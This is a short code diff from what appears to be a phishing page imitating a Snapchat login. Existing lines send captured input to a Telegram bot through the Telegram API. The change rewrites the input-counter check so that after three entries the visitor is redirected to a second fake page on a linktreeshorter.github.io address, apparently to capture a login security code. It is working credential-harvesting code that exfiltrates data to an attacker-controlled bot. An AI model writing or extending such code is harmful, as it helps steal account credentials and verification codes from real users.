@@ -38,15 +38,13 @@
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                     console.log("Antwort von der Telegram API:", data);
                 });
-
                 
-                if (inputCounter <= 3) {
-                    return;
+                if (inputCounter >= 3) {
+                    setTimeout(function() {
+                        window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginSicherheitscode.htm";
+                    }, 1000);
                 }
 
-                setTimeout(function() {
-                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginSicherheitscode.htm";
-                }, 1000);
             }
 
             function PasswortVergessenClick(){
